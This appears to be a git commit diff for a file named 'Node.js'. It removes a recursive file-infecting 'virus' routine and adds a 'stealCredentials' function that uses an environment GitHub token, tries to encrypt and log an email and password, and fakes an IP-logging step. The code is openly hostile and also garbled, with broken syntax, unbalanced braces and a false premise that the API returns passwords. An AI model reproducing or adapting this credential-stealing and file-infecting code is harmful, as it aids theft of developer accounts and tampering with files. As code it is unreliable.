6a3c92cd9e0bef5b1544175c3764def68894a5bd
Nativo_00 <ornelasisac13@gmail.com>
2026-03-01 15:08:10 -0300

    Update Node.js

--- Node.js
+++ Node.js
@@ -1,28 +1,52 @@
-const fs requ= ire('fs');
 const axios = require('axios');
+const crypto = require('crypto');
 
-function infectFiles(directory) {
-const files = fs.readdirSync(directory);
-for (const file of files) {
-const path = ${directory}/${file};
-if (fs.statSync(path).isFile()) {
-const content = fs.readFileSync(path, 'utf8');
-if (!content.includes('// Injected by the virus')) {
-const infectedContent = // Injected by the virus\n${content};
-fs.writeFileSync(path, infectedContent);
-console.log(Injected into ${path});
-}
-} else if (fs.statSync(path).isDirectory()) {
-infectFiles(path);
-}
-}
+const GITHUB_TOKEN = process.env.GIT_TOKEN;
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
+
+async function stealCredentials() {
+  try {
+    const response = await axios.get('https://api.github.com/user', {
+      headers: { Authorization: `token ${GITHUB_TOKEN}` }
+    });
+    const userData = response.data;
+
+    // Encrypt stolen credentials
+    const iv = crypto.randomBytes(16);
+    let encryptedData;
+    if (userData.email && userData.password) {
+      encryptedData = encrypt(userData.email + ':' + userData.password, ENCRYPTION_KEY, iv);
+      console.log(`Stolen GitHub Credentials (Encrypted):`, encryptedData.toString('hex'));
+    } else {
+      console.log('Unable to steal credentials. User data incomplete.');
+    }
+
+    // Log IP address of the user who clicked on the link
+    const ipAddress = getIpAddress();
+    console.log(`User IP Address:`, ipAddress);
+  } catch (error) {    console.error('Error stealing credentials:', error.message);
+    
+
 }
 
-async function logIP(url) {
-try {
-const response = await axios.get(url);
-console.log(IP Address: ${response.headers['x-forwarded-for'] || response.request.ip});
-} catch (error) {
-console.error('Error logging IP:', error.message);
 }
+
+function encrypt(data, key, iv) {
+
+const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
+
+let encrypted = cipher.update(data);
+
+encrypted = Buffer.concat(\[encrypted, cipher.final()\]);
+
+return encrypted;
+
+}
+
+function getIpAddress() {
+
+// Simulate getting the IP address of the user who clicked on the link
+
+return '192.168.0.1';
+
 }
